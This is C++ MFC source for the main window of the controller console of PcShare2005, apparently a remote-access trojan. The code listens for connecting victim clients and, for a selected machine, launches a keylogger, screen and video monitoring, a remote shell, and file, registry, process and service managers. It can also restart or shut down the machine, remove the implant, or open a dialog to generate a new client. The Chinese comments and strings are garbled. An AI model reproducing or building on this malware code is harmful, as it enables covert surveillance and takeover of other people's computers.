// MainFrm.cpp : implementation of the CMainFrame class
//

#include "stdafx.h"
#include "PcShare.h"
#include "MainFrm.h"
#include "MySetupDlg.h"
#include "MyClientTitleDlg.h"
#include ".\mycreateclientdlg.h"
#include "MyClientProxy.h"
#include ".\mainfrm.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CMainFrame

GOLBALVALUE m_MainValue = {0};

IMPLEMENT_DYNCREATE(CMainFrame, CFrameWnd)

BEGIN_MESSAGE_MAP(CMainFrame, CFrameWnd)
	//{{AFX_MSG_MAP(CMainFrame)
	ON_WM_CREATE()
	ON_WM_SIZE()
	ON_COMMAND(ID_CLIENT_CREATE, OnClientCreate)
	ON_COMMAND(ID_CLIENT_FILE_MANAGER, OnClientFileManager)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_FILE_MANAGER, OnUpdateClientFileManager)
	ON_COMMAND(ID_CLIENT_PC_RESTART, OnClientPcRestart)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_PC_RESTART, OnUpdateClientPcRestart)
	ON_COMMAND(ID_CLIENT_PC_SHUTDOWN, OnClientPcShutdown)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_PC_SHUTDOWN, OnUpdateClientPcShutdown)
	ON_COMMAND(ID_CLIENT_PRO_UNINSTALL, OnClientProUninstall)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_PRO_UNINSTALL, OnUpdateClientProUninstall)
	ON_COMMAND(ID_GLOBAL_SETUP, OnGlobalSetup)
	ON_COMMAND(ID_HELP, OnHelp)
	ON_COMMAND(ID_ALIVE_HELP, OnAliveHelp)
	ON_WM_CLOSE()
	ON_UPDATE_COMMAND_UI ( ID_CLIENT_LINK_COUNT,OnUpdatePane )
	ON_COMMAND(ID_LIST_DELETE_ITEM, OnListDeleteItem)
	ON_UPDATE_COMMAND_UI(ID_LIST_DELETE_ITEM, OnUpdateListDeleteItem)
	ON_COMMAND(ID_LIST_EMPTY_ITEM, OnListEmptyItem)
	ON_UPDATE_COMMAND_UI(ID_LIST_EMPTY_ITEM, OnUpdateListEmptyItem)
	ON_COMMAND(ID_SAVE_LIST_LOG, OnSaveListLog)
	ON_UPDATE_COMMAND_UI(ID_SAVE_LIST_LOG, OnUpdateSaveListLog)
	ON_COMMAND(ID_FRAME_MONITOR, OnFrameMonitor)
	ON_UPDATE_COMMAND_UI(ID_FRAME_MONITOR, OnUpdateFrameMonitor)
	ON_COMMAND(ID_MODIFY_TITLE, OnModifyTitle)
	ON_UPDATE_COMMAND_UI(ID_MODIFY_TITLE, OnUpdateModifyTitle)
	ON_COMMAND(ID_REGEDIT, OnRegEdit)
	ON_UPDATE_COMMAND_UI(ID_REGEDIT, OnUpdateRegEdit)
	ON_COMMAND(ID_PROC, OnProc)
	ON_UPDATE_COMMAND_UI(ID_PROC, OnUpdateProc)
	ON_COMMAND(ID_SERVICE, OnService)
	ON_UPDATE_COMMAND_UI(ID_SERVICE, OnUpdateService)
	ON_COMMAND(ID_MUILT, OnMulit)
	ON_UPDATE_COMMAND_UI(ID_MUILT, OnUpdateMulit)
	ON_COMMAND(ID_MONITORKEY, OnMonitorKey)
	ON_UPDATE_COMMAND_UI(ID_MONITORKEY, OnUpdateMonitorKey)
	ON_WM_COPYDATA()
	ON_WM_CONTEXTMENU()
	ON_COMMAND(ID_CLIENT_PROXY, OnClientProxy)
	//}}AFX_MSG_MAP
	ON_MESSAGE(WM_ADDCLIENT,OnAddClient)
	ON_MESSAGE(WM_MYITEMCHANGED,OnMyItemChanged)
	ON_MESSAGE(WM_CLOSEITEM,OnCloseItem)
	ON_MESSAGE(WM_CLIENTMAINRCLICK,OnMainRClick)
	ON_COMMAND(ID_TLNT, OnTlnt)
	ON_UPDATE_COMMAND_UI(ID_TLNT, OnUpdateTlnt)
END_MESSAGE_MAP()

static UINT indicators[] =
{
	ID_SEPARATOR,           // status line indicator
	ID_CLIENT_LINK_COUNT,
};

/////////////////////////////////////////////////////////////////////////////
// CMainFrame construction/destruction

CMainFrame::CMainFrame()
{
	pEventView = NULL;
	pClientListView = NULL;
}

CMainFrame::~CMainFrame()
{
	
}

CSize CMainFrame::LoadMyBitmap(UINT nID)
{
	CDC * pDC = GetDC();
	CDC m_MemDC;
	m_MemDC.CreateCompatibleDC(pDC);
	CSize m_Size = pDC->GetTextExtent("ˢ��");
	ReleaseDC(pDC);
	CRect rect(0,0,60,32);
	CBitmap *pBitmap,*pOldBitmap;
	pBitmap = new CBitmap;
	pBitmap->LoadBitmap(nID);
	pOldBitmap = m_MemDC.SelectObject(pBitmap);
	TransParentDC(rect,&m_MemDC);
	m_MemDC.SelectObject(pOldBitmap);
	m_ToolBarList.Add(pBitmap,GetSysColor(COLOR_MENU));
	pBitmap->DeleteObject();
	delete pBitmap;
	return m_Size;
}

int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	if (CFrameWnd::OnCreate(lpCreateStruct) == -1)
		return -1;

	if (!m_wndToolBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP
		| CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC) ||
		!m_wndToolBar.LoadToolBar(IDR_MAINFRAME))
	{
		TRACE0("Failed to create toolbar\n");
		return -1;      // fail to create
	}

	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		  sizeof(indicators)/sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return -1;      // fail to create
	}

	m_ToolBarList.Create(60,32,ILC_COLOR24|ILC_MASK,10,10);
	CSize m_Size = 
	LoadMyBitmap(IDB_BITMAP_MANA);
	LoadMyBitmap(IDB_BITMAP_FRAME);
	LoadMyBitmap(IDB_BITMAP_TLNT);
	LoadMyBitmap(IDB_BITMAP_KEY);

	LoadMyBitmap(IDB_BITMAP_PROC);
	LoadMyBitmap(IDB_BITMAP_REGEDIT);
	LoadMyBitmap(IDB_BITMAP_SERVICE);
	LoadMyBitmap(IDB_BITMAP_MULIT);

	LoadMyBitmap(IDB_BITMAP_SETUP);
	LoadMyBitmap(IDB_BITMAP_CREATE);
	LoadMyBitmap(IDB_BITMAP_HELP);
	LoadMyBitmap(IDB_BITMAP_INDEX);
	
	m_wndToolBar.SetButtonText(0,"�ļ�����");
	m_wndToolBar.SetButtonText(1,"��Ļ���");
	m_wndToolBar.SetButtonText(2,"�����ն�");
	m_wndToolBar.SetButtonText(3,"���̼��");

	m_wndToolBar.SetButtonText(5,"���̹���");
	m_wndToolBar.SetButtonText(6,"ע �� ��");
	m_wndToolBar.SetButtonText(7,"�������");
	m_wndToolBar.SetButtonText(8,"��Ƶ���");

	m_wndToolBar.SetButtonText(10,"��������");
	m_wndToolBar.SetButtonText(11,"���ɿͻ�");
	m_wndToolBar.GetToolBarCtrl().SetImageList(&m_ToolBarList);
	m_wndToolBar.GetToolBarCtrl().SetDisabledImageList(&m_ToolBarList);
	m_wndToolBar.GetToolBarCtrl().SetButtonSize(
		CSize(60,32 + m_Size.cy + 4));
	m_wndToolBar.GetToolBarCtrl().SetBitmapSize(CSize(58,32));
	
	CMenu* mmenu = GetMenu();
	m_MainMenu.Attach(mmenu->GetSafeHmenu());
	SetMenu(&m_MainMenu);

 	//ȡ����ܴ��ھ��
	m_MainValue.m_MainhWnd = GetSafeHwnd();
	return 0;
}

/////////////////////////////////////////////////////////////////////////////
// CMainFrame diagnostics

#ifdef _DEBUG
void CMainFrame::AssertValid() const
{
	CFrameWnd::AssertValid();
}

void CMainFrame::Dump(CDumpContext& dc) const
{
	CFrameWnd::Dump(dc);
}

#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CMainFrame message handlers


BOOL CMainFrame::OnCreateClient(LPCREATESTRUCT lpcs, CCreateContext* pContext) 
{
	if (!m_WndSplitter.CreateStatic(this, 2, 1,WS_CHILD | WS_VISIBLE))
		return FALSE;

	if (!m_WndSplitter.CreateView(0, 0, 
		RUNTIME_CLASS(CMyClientMainView),CSize(0, 0), pContext) ||
		!m_WndSplitter.CreateView(1, 0,
		RUNTIME_CLASS(CMyEventView),CSize(0, 300),pContext))
	{
		m_WndSplitter.DestroyWindow();
		return FALSE;
	}

	pClientListView = (CMyClientMainView*) m_WndSplitter.GetPane(0,0);
	pEventView = (CMyEventView*) m_WndSplitter.GetPane(1,0);
	return TRUE;
}

void CMainFrame::OnSize(UINT nType, int cx, int cy) 
{
	CFrameWnd::OnSize(nType, cx, cy);
	if(pClientListView != NULL && cx > 0)
	{
		m_WndSplitter.SetColumnInfo(0,cx * 1/4 + 9,0);
		m_WndSplitter.SetRowInfo(0,cy * 3/5 ,0);
		m_WndSplitter.RecalcLayout();
		UINT nID,nStyle;
		int Width;
		m_wndStatusBar.GetPaneInfo(1,nID,nStyle,Width);
		Width = cx * 1/6 - 15;
		m_wndStatusBar.SetPaneInfo(1,nID,nStyle,Width);

	}
}

void CMainFrame::OnClientCreate() 
{
	CMyCreateClientDlg dlg;
	dlg.DoModal();
}

void CMainFrame::OnClientPcRestart() 
{
	LPCLIENTITEM pItem = pClientListView->GetCurSel();
	if(pItem != NULL)
	{
		ProcessCmd(pItem->m_WorkSocket,
			CLIENT_SYSTEM_RESTART,NULL,0);
		DeleteCurItem();
	}		
}

void CMainFrame::OnUpdateClientPcRestart(CCmdUI* pCmdUI) 
{
	pCmdUI->Enable(pClientListView->
		GetListCtrl().GetSelectedCount() == 1);	
}

void CMainFrame::OnClientPcShutdown() 
{
	LPCLIENTITEM pItem = pClientListView->GetCurSel();
	if(pItem != NULL)
	{
		ProcessCmd(pItem->m_WorkSocket,
			CLIENT_SYSTEM_SHUTDOWN,NULL,0);
		DeleteCurItem();
	}	
}

void CMainFrame::OnUpdateClientPcShutdown(CCmdUI* pCmdUI) 
{
	pCmdUI->Enable(pClientListView->
		GetListCtrl().GetSelectedCount() == 1);	
}

void CMainFrame::OnClientProUninstall() 
{
	LPCLIENTITEM pItem = pClientListView->GetCurSel();
	if(pItem != NULL)
	{
		ProcessCmd(pItem->m_WorkSocket,
			CLIENT_PRO_UNINSTALL,NULL,0);
		DeleteCurItem();
	}
}

void CMainFrame::OnUpdateClientProUninstall(CCmdUI* pCmdUI) 
{
	pCmdUI->Enable(pClientListView->
		GetListCtrl().GetSelectedCount() == 1);	
}

void CMainFrame::OnGlobalSetup() 
{
	CMySetupDlg dlg;
	dlg.DoModal();
}

void CMainFrame::OnHelp() 
{
	PostMessage(WM_COMMAND,MAKEWPARAM(ID_APP_ABOUT,1),0);
}

void CMainFrame::OnAliveHelp() 
{
	ShellExecute(NULL,NULL,"./PcShare.chm",NULL,NULL,SW_SHOWMAXIMIZED);
}

LRESULT CMainFrame::OnAddClient(WPARAM wParam,LPARAM lParam)
{
	//�鿴�����Ƿ���
	char m_IniFileName[256] = {0};
	GetIniFileName(m_IniFileName);
	char m_sMaxLinkMain[100] = {0};
	GetPrivateProfileString("����","���ͻ���������",
		"999",m_sMaxLinkMain,99,m_IniFileName);
	if(pClientListView->GetListCtrl().GetItemCount() >
		atoi(m_sMaxLinkMain))
		return FALSE;

	//���ӿͻ�
	LPCLIENTITEM pItem = pClientListView->InsertItem((LPCLIENTITEM) wParam);
	
	//��ʾ��Ϣ
	char m_Text[256] = {0};
	sprintf(m_Text,"�ͻ���%s - %s���Ѿ�����",
		pItem->m_Title,	pItem->m_SysInfo.m_PcName);
	ShowMyText(m_Text , FALSE);

	//�鿴�Ƿ����ļ�����
	char m_FilePath[256] = {0};
	GetModuleFileName(NULL,m_FilePath,200);
	char *p = strrchr(m_FilePath,'\\');
	if(p != NULL) 
		*(p + 1) = 0;
	else
		return TRUE;
	strcat(m_FilePath,"data");
	char m_FileName[256] = {0};
	sprintf(m_FileName,"%s\\%s.ini",m_FilePath,pItem->m_SysInfo.ID);

	CFileStatus m_FileStatus;
	if(CFile::GetStatus(m_FileName,m_FileStatus))
	{
		if(m_FileStatus.m_size != 0)
		{
			//�������̿�ʼ����
			StartChildWork(pItem, "�ļ�����", CLIENT_FILES_START, "PcFile.exe");
		}
		else
			DeleteFile(m_FileName);
	}
	return TRUE;
}

void CMainFrame::StartWork()
{
	//������ҳ

	//ȡINI�ļ�����
	char m_IniFileName[256] = {0};
	GetIniFileName(m_IniFileName);

	//ȡIP��ַ�б���Ϣ
	PHOSTENT hostinfo;
	char name[512] = {0};
	if(gethostname (name,sizeof(name)) != 0 ||
		(hostinfo = gethostbyname(name)) == NULL)
	{
		ShowMyText("ȡ���ص�ַ�б�ʧ��",TRUE);
		return;
	}
	CString m_AddrList;
	struct sockaddr_in dest;
	for(int i=0; hostinfo->h_addr_list[i] != NULL ;i++)
	{
		memcpy(&(dest.sin_addr), 
			hostinfo->h_addr_list[i],
			hostinfo->h_length);
		m_AddrList += inet_ntoa(dest.sin_addr);
		m_AddrList += "-";
	}
	char m_Text[512] = {0};
	sprintf(m_Text,"����IP��ַ�б���%s��",
		m_AddrList.Left(m_AddrList.GetLength() - 1));
	ShowMyText(m_Text,FALSE);
	wsprintf(m_Text,"PcShare2005(VIP�汾)-���ؽ���: %s",
		m_AddrList.Left(m_AddrList.GetLength() - 1));
	SetWindowText(m_Text);

	//�����������˿�
	char m_sPortMain[100] = {0};
	GetPrivateProfileString("����","�Զ��������Ӷ˿�",
		"80",m_sPortMain,99,m_IniFileName);
	m_MainSocket = StartTcp(atoi(m_sPortMain));
	if(m_MainSocket	== NULL)
	{
		ShowMyText("���ƶ˿ڱ�ռ�ã���ʼ��ʧ��,��ر�iis����",TRUE);
		return ;
	}
	wsprintf(m_Text,"���������˿ڡ�%s��",m_sPortMain);
	ShowMyText(m_Text,FALSE);

	//���������߳�
	ShowMyText("��ʼ���ɹ�,�ȴ��ͻ�����",FALSE);
	UINT m_Id = 0;
	_beginthreadex(NULL,0,MyMainThread,(LPVOID) m_MainSocket,0,&m_Id);
}

void CMainFrame::ShowMyText(LPCTSTR Text,BOOL Flag)
{
	pEventView->InsertItem(Text,Flag);
}

void CMainFrame::OnClose() 
{
	StopWork();
	CFrameWnd::OnClose();
}

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	char m_Title[256] = {0};
	::GetWindowText(hwnd,m_Title,250);
	if(!memcmp(m_Title,"PCSHARE",7) &&
		strchr(m_Title,'-') != NULL)
	{
		::SendMessage(hwnd,WM_CLOSE,0,0);
	}
	return TRUE;
}
void CMainFrame::StopWork()
{
	CWaitCursor m_Cur;
	m_MainValue.m_IsMainExit = TRUE;
	EnumWindows(EnumWindowsProc,NULL);

	//�ر��׽���
	closesocket(m_MainSocket);
	pClientListView->StopWork();
	m_Cur.Restore();
}

LRESULT CMainFrame::OnMyItemChanged(WPARAM wParam,LPARAM lParam)
{
	return TRUE;
}

LRESULT CMainFrame::OnCloseItem(WPARAM wParam,LPARAM lParam)
{
	if(WSAGETSELECTEVENT(lParam) == FD_CLOSE)
	{
		DWORD pClientItem = 
			pClientListView->CloseClient((SOCKET) wParam);
	}
	return TRUE;
}

void CMainFrame::OnUpdatePane(CCmdUI *pCmdUI)  
{
	char m_Text[256];
	sprintf(m_Text,"��ǰ���ӿͻ�%d��",
		pClientListView->GetListCtrl().GetItemCount());
	pCmdUI->SetText(m_Text);
}

LRESULT CMainFrame::OnMainRClick(WPARAM wParam,LPARAM lParam)
{
	CPoint m_point;
	CNewMenu m_menu;
	m_menu.LoadMenu(wParam);
	GetCursorPos(&m_point);
	SetForegroundWindow();   
	m_menu.GetSubMenu(0)->
		TrackPopupMenu(TPM_LEFTALIGN|
		TPM_RIGHTBUTTON,
		m_point.x,m_point.y,this);
	m_menu.DestroyMenu();	
	return TRUE;
}

void CMainFrame::ProcessCmd(SOCKET s, UINT Command,char *pExterndata,int len)
{
	CWaitCursor m_Cur;
	CMDINFO m_CmdInfo = {0};
	m_CmdInfo.m_Command = Command;
	if(pExterndata != NULL)
		m_CmdInfo.m_DataLen = len;

	//�ر��¼�֪ͨ
	WSAAsyncSelect(s,GetSafeHwnd(), 0, 0);
	ULONG icmd = 0;   
    if(ioctlsocket(s,FIONBIO,&icmd))
	{
		PostMessage(WM_COMMAND,
			MAKEWPARAM(ID_CLIENT_DELETE,1),NULL);
		closesocket(s);
		m_Cur.Restore();
		return;
	}

	if(!SendData(s,(char*) &m_CmdInfo,
		sizeof(CMDINFO)))
	{
		PostMessage(WM_COMMAND,
			MAKEWPARAM(ID_CLIENT_DELETE,1),NULL);
		closesocket(s);
		m_Cur.Restore();
		return;
	}

	if(pExterndata != NULL)
	{
		if(!SendData(s,pExterndata,
			m_CmdInfo.m_DataLen))
		{
			PostMessage(WM_COMMAND,
				MAKEWPARAM(ID_CLIENT_DELETE,1),NULL);
			closesocket(s);
			m_Cur.Restore();
			return;
		}
	}

	//�����¼�֪ͨ
	if(WSAAsyncSelect(s,GetSafeHwnd(),
		WM_CLOSEITEM,FD_CLOSE) == SOCKET_ERROR)
	{
		PostMessage(WM_COMMAND,
			MAKEWPARAM(ID_CLIENT_DELETE,1),NULL);
		closesocket(s);
		m_Cur.Restore();
		return;
	}
	m_Cur.Restore();
}

void CMainFrame::DeleteCurItem()
{
	pClientListView->DeleteCurItem();
}

void CMainFrame::ResizeWnd()
{
	pEventView->SendMessage(WM_RESIZE_WND,0,0);
	pClientListView->SendMessage(WM_RESIZE_WND,0,0);
}

void CMainFrame::OnListDeleteItem() 
{
	int nCount = pEventView->GetListCtrl().GetSelectedCount();
	for(int  i = 0; i < nCount; i++)
	{
		int nItem = pEventView->GetListCtrl().
			GetNextItem(-1,LVNI_SELECTED);
		pEventView->GetListCtrl().DeleteItem(nItem);
	}
	pEventView->SendMessage(WM_RESIZE_WND,0,0);
}

void CMainFrame::OnUpdateListDeleteItem(CCmdUI* pCmdUI) 
{
	pCmdUI->Enable(pEventView->GetListCtrl().GetSelectedCount() > 0);
}

void CMainFrame::OnListEmptyItem() 
{
	pEventView->GetListCtrl().DeleteAllItems();	
	pEventView->SendMessage(WM_RESIZE_WND,0,0);
}

void CMainFrame::OnUpdateListEmptyItem(CCmdUI* pCmdUI) 
{
	pCmdUI->Enable(pEventView->GetListCtrl().GetItemCount() > 0);
}

void CMainFrame::OnSaveListLog() 
{
	CString szFilter = "��־�ļ�(*.txt)|*.txt|";
	CFileDialog m_filedialog(FALSE,NULL,"pslog.txt",
		OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT,szFilter,this);
	if(m_filedialog.DoModal()!=IDOK) return;

	CFile m_File(m_filedialog.GetPathName(),
		CFile::modeCreate|CFile::modeWrite);
	int nCount = pEventView->GetListCtrl().GetSelectedCount();
	for(int  i = 0; i < pEventView->
		GetListCtrl().GetItemCount(); i++)
	{
		char m_Text[512] = {0};
		sprintf(m_Text,"����ʱ�䣺%s �¼����ݣ�%s\r\n",
			pEventView->GetListCtrl().GetItemText(i,0),
			pEventView->GetListCtrl().GetItemText(i,1));
		m_File.Write(m_Text,strlen(m_Text));
	}
	m_File.Close();
}

void CMainFrame::OnUpdateSaveListLog(CCmdUI* pCmdUI) 
{
	pCmdUI->Enable(pEventView->GetListCtrl().GetItemCount() > 0);
}

void CMainFrame::OnClientFileManager() 
{
	StartChildWork(pClientListView->GetCurSel(), "�ļ�����", CLIENT_FILES_START, "PcFile.exe");
}

void CMainFrame::OnUpdateClientFileManager(CCmdUI* pCmdUI) 
{
	pCmdUI->Enable(pClientListView->GetCurSel() != NULL);
}

void CMainFrame::OnFrameMonitor() 
{
	StartChildWork(pClientListView->GetCurSel(), "��Ļ���", CLIENT_FRAME_START, "PcFrame.a");
}

void CMainFrame::OnUpdateFrameMonitor(CCmdUI* pCmdUI) 
{
	pCmdUI->Enable(pClientListView->GetCurSel() != NULL);
}

void CMainFrame::OnRegEdit() 
{
	StartChildWork(pClientListView->GetCurSel(), "ע������", CLIENT_REGEDIT_START, "PcRegedit.exe");
}

void CMainFrame::OnUpdateRegEdit(CCmdUI* pCmdUI) 
{
	pCmdUI->Enable(pClientListView->GetCurSel() != NULL);
}

void CMainFrame::OnModifyTitle() 
{
	LPCLIENTITEM pItem = pClientListView->GetCurSel();
	if(!pItem) return;	

	char m_LogFileName[256] = {0};
	GetModuleFileName(NULL,m_LogFileName,250);
	char *p = strrchr(m_LogFileName,'.');
	*p = 0;
	strcat(m_LogFileName,".log");

	char m_Name[256] = {0};
	GetPrivateProfileString("�ͻ�ע��",pItem->m_SysInfo.ID,
		pItem->m_SysInfo.m_PcName,m_Name,255,m_LogFileName);

	CMyClientTitleDlg dlg(m_Name);
	if(dlg.DoModal() != IDOK) return;
	WritePrivateProfileString("�ͻ�ע��",pItem->m_SysInfo.ID,
		dlg.m_Title,m_LogFileName);
	pClientListView->SetItemInfo(dlg.m_Title.LockBuffer() , pItem->m_SysInfo.ID);
}

void CMainFrame::OnUpdateModifyTitle(CCmdUI* pCmdUI) 
{
	pCmdUI->Enable(pClientListView->GetListCtrl().GetSelectedCount() == 1);	
}

void CMainFrame::StartChildWork(LPCLIENTITEM pItem, char* pTitle, UINT nCmd,char* pExeName)
{
	if(!pItem) return;

	char m_Text[256] = {0};
	sprintf(m_Text,"PCSHARE%s-%s", pTitle, pItem->m_Title);
	HWND hWnd = ::FindWindow(NULL,m_Text);
	if(hWnd)
	{
		::BringWindowToTop(hWnd);
		return;
	}

	char* pFind = strrchr(m_Text,':');
	if(pFind != NULL) *pFind = 0;

	//�����µ��ӽ���
	char m_AppName[512] = {0};
	char m_FileName[256];
	strcpy(m_FileName, pExeName);
	GetMyFilePath(m_FileName);
	sprintf(m_AppName,"%s %s:%s",m_FileName,m_Text,pItem->m_SysInfo.ID);

	STARTUPINFO st = {0};
	st.cb = sizeof(STARTUPINFO);
	PROCESS_INFORMATION pi = {0};
	if(!CreateProcess(NULL , m_AppName , NULL , 
		NULL , TRUE , 0 , NULL , NULL , &st , &pi))
		return;
	
	ExecCmd(pItem->m_WorkSocket , nCmd , 0);
}

void CMainFrame::OnTlnt()
{
	StartChildWork(pClientListView->GetCurSel(), "�����ն�", CLIENT_TLNT_START, "PcTlnt.exe");
}

void CMainFrame::OnUpdateTlnt(CCmdUI *pCmdUI)
{
	pCmdUI->Enable(pClientListView->GetCurSel() != NULL);
}

void CMainFrame::OnProc()
{
	StartChildWork(pClientListView->GetCurSel(), "���̹���", CLIENT_PROC_START, "PcProc.exe");
}

void CMainFrame::OnUpdateProc(CCmdUI *pCmdUI)
{
	pCmdUI->Enable(pClientListView->GetCurSel() != NULL);
}

void CMainFrame::OnService()
{
	StartChildWork(pClientListView->GetCurSel(), "�������", CLIENT_SERVICE_START, "PcService.exe");
}

void CMainFrame::OnUpdateService(CCmdUI *pCmdUI)
{
	pCmdUI->Enable(pClientListView->GetCurSel() != NULL);
}

void CMainFrame::OnMulit()
{
	StartChildWork(pClientListView->GetCurSel(), "��Ƶ���", CLIENT_MULIT_START, "PcMulit.exe");
}

void CMainFrame::OnUpdateMulit(CCmdUI *pCmdUI)
{
	pCmdUI->Enable(pClientListView->GetCurSel() != NULL);
}
void CMainFrame::OnMonitorKey()
{
	StartChildWork(pClientListView->GetCurSel(), "���̼��", CLIENT_KEYMON_START, "PcKeyMon.exe");
}

void CMainFrame::OnUpdateMonitorKey(CCmdUI *pCmdUI)
{
	pCmdUI->Enable(pClientListView->GetCurSel() != NULL);
}

BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs) 
{
	CFrameWnd::PreCreateWindow(cs);
	cs.style ^= WS_MAXIMIZE;   
	cs.dwExStyle &= ~WS_EX_CLIENTEDGE;
	cs.lpszClass = AfxRegisterWndClass(
		CS_VREDRAW | CS_HREDRAW,
		LoadCursor(NULL, IDC_ARROW),
		(HBRUSH) GetStockObject(WHITE_BRUSH),
		AfxGetApp()->LoadIcon(IDR_MAINFRAME));
	return TRUE;	
}

void CMainFrame::OnClientProxy() 
{
	LPCLIENTITEM pItem = pClientListView->GetCurSel();
	if(!pItem) return;	

	CMyClientProxy dlg;
	if(dlg.DoModal() != IDOK) return;

	ExecCmd(pItem->m_WorkSocket , CLIENT_PROXY , dlg.m_Port);
}
